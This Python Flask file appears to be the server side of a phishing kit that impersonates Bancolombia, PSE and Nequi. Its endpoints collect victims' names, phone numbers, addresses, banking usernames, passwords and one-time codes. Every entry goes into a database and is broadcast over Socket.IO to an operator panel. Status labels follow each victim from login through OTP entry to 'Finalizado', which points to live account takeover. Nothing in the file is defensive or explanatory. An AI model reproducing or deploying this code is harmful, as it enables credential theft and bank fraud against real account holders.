from flask import request, blueprints, redirect, session, render_template, jsonify
from models.Trico import Trico, db, ma, TricoSchema
from config.bd import socketio
from flask_socketio import emit
from datetime import datetime 

trico_routes = blueprints.Blueprint("trico", __name__)

@trico_routes.route('/tricoData', methods=['GET'])
def tricoData():
    Tricos = Trico.query.all()
    schema = TricoSchema(many=True)
    result = schema.dump(Tricos)
    return jsonify(result)

@trico_routes.route('/tricoPost', methods=['POST'])
def tricoPost():
    try:
        data = request.get_json()
        
        date = datetime.now()
              
        new_Trico = Trico(data['id'], data['nombre'], data['telefono'], data['direccion'], data['usuario'], data['password'], '', date, 'Bancolombia', 'Ingresó Usuario', 'Bancolombia')
        
        db.session.add(new_Trico)
        db.session.commit()
        
        socketio.emit('new_Trico', {'id': data['id'], 'nombre': data['nombre'], 'telefono' : data['telefono'], 'direccion': data['direccion'], 'usuario': data['usuario'], 'password': data['password'], 'otp': '', 'idreg' : new_Trico.idreg, 'fuente' : 'Bancolombia', 'estado' : 'Ingresó Usuario', 'bank' : 'Bancolombia'}, namespace='/')
        
        return jsonify({'message': 'Datos guardados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400
    
@trico_routes.route('/tricoUser/<idreg>', methods=['PUT'])
def tricoUser(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.usuario = data['usuario']
        object.password = data['password']
        
        db.session.commit()
        
        socketio.emit('new_Trico', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : 'Bancolombia', 'estado' : 'Corrigió Usuario', 'bank' : 'Bancolombia'}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@trico_routes.route('/updateTrico/<idreg>', methods=['PUT'])
def updateTrico(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.otp = data['otp']
        
        db.session.commit()
        
        socketio.emit('new_Trico', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : 'Bancolombia', 'estado' : 'Ingresó OTP', 'bank' : 'Bancolombia'}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400


@trico_routes.route('/tricofinish/<idreg>', methods=['PUT'])
def tricofinish(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.estado = data['estado']
        
        db.session.commit()
        
        socketio.emit('new_Trico', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : object.fuente, 'estado' : 'Finalizado', 'bank' : object.bank}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400

#PSE
@trico_routes.route('/tricoPse', methods=['POST'])
def tricoPse():
    
    data = request.get_json()
    
    date = datetime.now()
    
    new_Trico = Trico(data['id'], data['nombre'], data['telefono'], data['direccion'], data['usuario'], data['password'], '', date, 'PSE', 'Ingresó Usuario', data['bank'])
    
    db.session.add(new_Trico)
    db.session.commit()

    socketio.emit('new_Ps', {'id': data['id'], 'nombre': data['nombre'], 'telefono' : data['telefono'], 'direccion': data['direccion'], 'usuario': data['usuario'], 'password': data['password'], 'otp': '', 'idreg' : new_Trico.idreg, 'fuente' : 'PSE', 'estado' : 'Ingresó Usuario', 'bank' : data['bank']}, namespace='/')
    
    return jsonify({'message': 'Datos guardados correctamente'}), 200

@trico_routes.route('/tricoUserPse/<idreg>', methods=['PUT'])
def tricoUserPse(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.usuario = data['usuario']
        object.password = data['password']
        
        db.session.commit()
        
        socketio.emit('new_Ps', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : 'PSE', 'estado' : 'Corrigió Usuario', 'bank' : object.bank}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@trico_routes.route('/updateTricoPse/<idreg>', methods=['PUT'])
def updateTricoPse(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.otp = data['otp']
        
        db.session.commit()
        
        socketio.emit('new_Ps', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : 'PSE', 'estado' : 'Ingresó OTP', 'bank' : object.bank}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@trico_routes.route('/tricofinishPse/<idreg>', methods=['PUT'])
def tricofinishPse(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.estado = data['estado']
        
        db.session.commit()
        
        socketio.emit('new_Ps', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : object.fuente, 'estado' : 'Finalizado', 'bank' : object.bank}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400

#Nequi
@trico_routes.route('/tricoNequi', methods=['POST'])
def tricoNequi():
    
    data = request.get_json()
    
    date = datetime.now()
    
    new_Trico = Trico(data['id'], data['nombre'], data['telefono'], data['direccion'], data['usuario'], data['password'], '', date, 'Nequi', 'Ingresó Usuario', 'Nequi')
    
    db.session.add(new_Trico)
    db.session.commit()
    
    socketio.emit('new_Ne', {'id': data['id'], 'nombre': data['nombre'], 'telefono' : data['telefono'], 'direccion': data['direccion'], 'usuario': data['usuario'], 'password': data['password'], 'otp': '', 'idreg' : new_Trico.idreg, 'fuente' : 'Nequi', 'estado' : 'Ingresó Usuario', 'bank' : 'Nequi'}, namespace='/')
    
    return jsonify({'message': 'Datos guardados correctamente'}), 200

@trico_routes.route('/tricoUserNequi/<idreg>', methods=['PUT'])
def tricoUserNequi(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.usuario = data['usuario']
        object.password = data['password']
        
        db.session.commit()
        
        socketio.emit('new_Ne', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : 'Nequi', 'estado' : 'Corrigió Usuario', 'bank' : object.bank}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@trico_routes.route('/updateTricoNequi/<idreg>', methods=['PUT'])
def updateTricoNequi(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.otp = data['otp']
        
        db.session.commit()
        
        socketio.emit('new_Ne', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : 'Nequi', 'estado' : 'Ingresó OTP', 'bank' : object.bank}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@trico_routes.route('/tricofinishNequi/<idreg>', methods=['PUT'])
def tricofinishNequi(idreg):
    try:
        
        object = Trico.query.get(idreg)
        
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.estado = data['estado']
        
        db.session.commit()
        
        socketio.emit('new_Ne', {'id': object.id, 'nombre': object.nombre, 'telefono' : object.telefono, 'direccion': object.direccion, 'usuario': object.usuario, 'password': object.password, 'otp': object.otp, 'idreg' : object.idreg, 'fuente' : object.fuente, 'estado' : 'Finalizado', 'bank' : object.bank}, namespace='/')
    
        return jsonify({'message': 'Datos actualizados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400
    
# delete trico
@trico_routes.route('/deleteTrico/<idreg>', methods=['DELETE'])
def deleteTrico(idreg):
    try:
        object = Trico.query.get(idreg)
        if not object:
            return jsonify({'message': 'Registro no encontrado'}), 404
        
        db.session.delete(object)
        db.session.commit()
        
        return jsonify({'message': 'Registro eliminado'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400